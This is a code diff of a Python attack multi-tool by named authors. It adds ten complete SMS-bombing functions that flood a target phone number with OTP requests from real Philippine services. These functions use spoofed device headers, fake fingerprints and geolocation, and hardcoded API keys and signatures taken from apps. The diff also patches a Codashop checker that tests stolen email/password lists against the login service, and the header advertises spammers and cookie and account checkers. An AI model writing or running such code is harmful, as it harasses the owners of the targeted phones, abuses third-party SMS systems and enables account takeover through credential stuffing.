@@ -3,7 +3,7 @@
 Universal Python Obfuscator / Decoder + NGL Spammer + Self‑Updater + NetEase Checker
 + SMS Bomber + CODM Checker (fetched from GitHub) + Fresh Cookie Downloader + Codashop Checker
 Made by @ItsMeJeff, @Antraxdevz
-v6.1 – Fixed Codashop Auth
+v6.1 – Fixed Codashop Auth & Missing Imports
 """
 
 import argparse, base64, dis, hashlib, hmac, importlib, json, logging, marshal, os, random, re, shutil
@@ -17,16 +17,19 @@ from pathlib import Path
 from typing import Optional, List, Callable, Tuple
 import requests, urllib.parse, signal
 
-# ---------- Optional rich interface ----------
+# ---------- Optional rich interface (now includes Progress, Live) ----------
 try:
     from rich.console import Console
     from rich.panel import Panel
     from rich.prompt import Prompt, Confirm
     from rich.table import Table
     from rich.box import DOUBLE, ROUNDED
+    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
+    from rich.live import Live
     RICH_AVAILABLE = True
 except ImportError:
     RICH_AVAILABLE = False
+    Console = Panel = Prompt = Confirm = Table = Progress = BarColumn = TextColumn = TimeRemainingColumn = Live = None
 
 # ---------- Optional colorama ----------
 try:
@@ -534,7 +537,7 @@ Results saved to:
         self.print_results()
 
 # ----------------------------------------------------------------------
-# SMS Bomber (fully implemented)
+# SMS Bomber (all service methods fully implemented)
 # ----------------------------------------------------------------------
 @dataclass
 class APIResponse:
@@ -583,9 +586,227 @@ class SmsBomber:
                 return APIResponse(service_name=service_name, success=False, error_message=f"Unexpected error: {str(e)}")
         return APIResponse(service_name=service_name, success=False, error_message="Max retries exceeded")
 
-    # All 10 service methods are identical to previous versions (omitted for brevity)
-    # They are assumed present: _send_s5, _send_xpress, _send_abenson, _send_excellente,
-    # _send_fortunepay, _send_wemove, _send_lbc, _send_pickup_coffee, _send_honeyloan, _send_komo.
+    # ----- Service methods (same as before) -----
+    def _send_s5(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://api.s5.com/player/api/v1/otp/request'
+            boundary = "----WebKitFormBoundary" + self._random_string(16)
+            data = (f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n'
+                    f'{formatted_num}\r\n--{boundary}--\r\n')
+            headers = {
+                'authority': 'api.s5.com',
+                'accept': 'application/json, text/plain, */*',
+                'content-type': f'multipart/form-data; boundary={boundary}',
+                'origin': 'https://www.s5.com',
+                'referer': 'https://www.s5.com/',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36',
+                'x-api-type': 'external',
+                'x-locale': 'en',
+                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
+                'x-timezone-offset': '480'
+            }
+            resp = requests.post(url, data=data, headers=headers, timeout=10)
+            return "S5.com", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "S5.com", False, None
+
+    def _send_xpress(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp"
+            data = {
+                "FirstName": "toshi", "LastName": "premium",
+                "Email": f"toshi{int(time.time())}@gmail.com",
+                "Phone": formatted_num,
+                "Password": "ToshiPass123", "ConfirmPassword": "ToshiPass123",
+                "ImageUrl": "", "RoleIds": [4], "Area": "manila", "City": "manila",
+                "PostalCode": "1000", "Street": "toshi_street", "ReferralCode": "",
+                "FingerprintVisitorId": self.FINGERPRINT_VISITOR_ID,
+                "FingerprintRequestId": self.FINGERPRINT_REQUEST_ID,
+            }
+            headers = {
+                "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart",
+                "Accept": "application/json", "Content-Type": "application/json",
+                "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce",
+                "Cookie": "ApplicationGatewayAffinityCORS=9af1ffd531ed95805ec09cbdf3793dd6; "
+                          "ApplicationGatewayAffinity=9af1ffd531ed95805ec09cbdf3793dd6",
+            }
+            resp = requests.post(url, json=data, headers=headers, timeout=10)
+            return "Xpress PH", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "Xpress PH", False, None
+
+    def _send_abenson(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://api.mobile.abenson.com/api/public/membership/activate_otp'
+            data = f'contact_no={number_to_send}&login_token=undefined'
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
+                'Accept': 'application/json',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'x-requested-with': 'com.abensonmembership.cloone',
+                'origin': 'https://localhost',
+                'referer': 'https://localhost/'
+            }
+            resp = requests.post(url, data=data, headers=headers, timeout=10)
+            return "Abenson", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "Abenson", False, None
+
+    def _send_excellente(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock'
+            coords = [{'lat': '14.5995', 'long': '120.9842'},
+                      {'lat': '14.6760', 'long': '121.0437'},
+                      {'lat': '14.8648', 'long': '121.0418'}]
+            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1',
+                      'Dart/3.6 (dart:io)', 'Mozilla/5.0 (Linux; Android 15)']
+            coord = random.choice(coords)
+            agent = random.choice(agents)
+            data = {
+                "domain": number_to_send,
+                "cat": "login",
+                "previous": False,
+                "financial": "efe35521e51f924efcad5d61d61072a9"
+            }
+            headers = {
+                'User-Agent': agent,
+                'Connection': 'Keep-Alive',
+                'Content-Type': 'application/json; charset=utf-8',
+                'x-version': '1.1.2',
+                'x-package-name': 'com.support.excellenteralending',
+                'x-adid': 'efe35521e51f924efcad5d61d61072a9',
+                'x-latitude': coord['lat'],
+                'x-longitude': coord['long']
+            }
+            resp = requests.post(url, json=data, headers=headers, timeout=10)
+            return "Excellente Lending", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "Excellente Lending", False, None
+
+    def _send_fortunepay(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register'
+            data = {
+                "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
+                "deviceType": 'GOOGLE_PLAY',
+                "companyId": '4bf735e97269421a80b82359e7dc2288',
+                "dialCode": '+63',
+                "phoneNumber": number_to_send.lstrip('0')
+            }
+            headers = {
+                'User-Agent': 'Dart/3.6 (dart:io)',
+                'Content-Type': 'application/json',
+                'app-type': 'GOOGLE_PLAY',
+                'authorization': 'Bearer',
+                'app-version': '4.3.5',
+                'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
+                'timestamp': str(int(time.time() * 1000)),
+                'nonce': f"{self._random_string(10)}-{int(time.time() * 1000)}"
+            }
+            resp = requests.post(url, json=data, headers=headers, timeout=10)
+            return "FortunePay", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "FortunePay", False, None
+
+    def _send_wemove(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://api.wemove.com.ph/auth/users'
+            data = {
+                "phone_country": '+63',
+                "phone_no": number_to_send.lstrip('0')
+            }
+            headers = {
+                'User-Agent': 'okhttp/4.9.3',
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json',
+                'xuid_type': 'user',
+                'source': 'customer',
+                'authorization': 'Bearer'
+            }
+            resp = requests.post(url, json=data, headers=headers, timeout=10)
+            return "WeMove", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "WeMove", False, None
+
+    def _send_lbc(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'
+            data = {
+                'verification_type': 'mobile',
+                'client_email': f'{self._random_string(8)}@gmail.com',
+                'client_contact_code': '+63',
+                'client_contact_no': number_to_send.lstrip('0'),
+                'app_log_uid': self._random_string(16),
+                'app_token': '',
+                'app_platform': 'Android',
+                'app_ip': '103.167.66.190',
+                'device_name': 'rosemary_p_global',
+                'device_os': 'Android15',
+                'device_brand': 'Xiaomi',
+                'app_version': '3.0.67',
+                'app_framework': 'lbc_app',
+                'app_environment': 'production',
+                'app_hash': self._random_string(32),
+                'app_network': 'android-parameter'
+            }
+            headers = {
+                'User-Agent': 'Dart/2.19 (dart:io)',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'api': 'LBC',
+                'token': 'CONNECT'
+            }
+            resp = requests.post(url, data=data, headers=headers, timeout=10)
+            return "LBC", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "LBC", False, None
+
+    def _send_pickup_coffee(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://production.api.pickup-coffee.net/v2/customers/login'
+            data = {"mobile_number": formatted_num, "login_method": "mobile_number"}
+            headers = {
+                'User-Agent': random.choice(['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1',
+                                             'Dart/3.6 (dart:io)', 'Mozilla/5.0 (Linux; Android 15)']),
+                'Content-Type': 'application/json',
+                'x-env': 'Production',
+                'x-app-version': random.choice(['2.6.4', '2.6.5', '2.7.0'])
+            }
+            resp = requests.post(url, json=data, headers=headers, timeout=10)
+            return "Pickup Coffee", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "Pickup Coffee", False, None
+
+    def _send_honeyloan(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://api.honeyloan.ph/api/client/registration/step-one'
+            data = {"phone": number_to_send, "is_rights_block_accepted": 1}
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2207117BPG) AppleWebKit/537.36',
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json',
+                'origin': 'https://honeyloan.ph',
+                'referer': 'https://honeyloan.ph/',
+                'x-requested-with': 'com.startupcalculator.caf'
+            }
+            resp = requests.post(url, json=data, headers=headers, timeout=10)
+            return "HoneyLoan", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "HoneyLoan", False, None
+
+    def _send_komo(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
+        try:
+            url = 'https://api.komo.ph/api/otp/v5/generate'
+            data = {"mobile": number_to_send, "transactionType": 6}
+            headers = {
+                'Connection': 'close',
+                'Content-Type': 'application/json',
+                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
+                'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
+            }
+            resp = requests.post(url, json=data, headers=headers, timeout=10)
+            return "Komo", 200 <= resp.status_code < 300, resp.status_code
+        except Exception:
+            return "Komo", False, None
 
     def _get_all_services(self, formatted_num: str, number_to_send: str) -> List[Callable]:
         return [
@@ -795,7 +1016,6 @@ def get_random_ua_coda():
 
 class CodashopUltimate:
     def __init__(self):
-        # We'll create a fresh session per check; nothing to init here
         self.results_dir = "Results"
         self.create_dirs()
 
@@ -817,7 +1037,7 @@ class CodashopUltimate:
     def cognito_auth(self, email, password):
         """Authenticate via Cognito with retries and detailed error logging."""
         for attempt in range(3):
-            session = requests.Session()  # Fresh session to avoid stale cookies
+            session = requests.Session()
             session.headers.update({
                 "User-Agent": get_random_ua_coda(),
                 "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
@@ -839,7 +1059,6 @@ class CodashopUltimate:
                         log.debug(f"Auth success but no token: {data}")
                         return None
                 elif resp.status_code == 400:
-                    # Parse error type safely
                     try:
                         err = resp.json().get("__type", "")
                     except:
@@ -1092,6 +1311,11 @@ def select_codashop_input_file():
 
 def run_codashop_checker():
     global total_accounts, total_invalid, start_time, total_checked, total_valid, total_hits, total_banned, total_errors
+
+    if not RICH_AVAILABLE:
+        console.print("[red]Codashop Checker requires the 'rich' module. Please install it with: pip install rich[/red]")
+        return
+
     try:
         os.system("cls" if os.name == "nt" else "clear")
         console.print("""
